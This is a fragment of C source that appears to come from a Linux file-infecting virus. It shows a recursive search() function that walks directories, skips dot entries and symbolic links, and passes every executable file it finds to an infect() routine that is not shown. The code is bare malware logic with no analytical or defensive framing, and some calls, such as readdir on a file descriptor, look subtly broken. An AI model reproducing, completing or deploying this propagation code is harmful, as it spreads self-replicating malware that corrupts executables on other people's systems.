#include <linux/dirent.h>

static void search(char *dir_name)
{
	struct stat sbuf;
	struct dirent d;
	int h;
	char ddot[3] = { '.', '.', '\0' };

	if (dir_name == NULL)
		dir_name = ddot + 1;
	if ((h = open(dir_name, 0)) < 0)
		return;
	while (readdir(h, &d)) {
		if (d.d_name[0] == '.')
			if (d.d_name[1] == '\0' || *(uint16_t*)(d.d_name + 1) == 0x2e)
				continue;
		lstat(d.d_name, &sbuf);
		if (S_ISLNK(sbuf.st_mode))
			continue;
		if (chdir(d.d_name) == 0) {
			search(ddot + 1);
			chdir(ddot);
		} else {
			if (access(d.d_name, X_OK) == 0)
				infect(d.d_name);
		}
	}
	close(h);
}
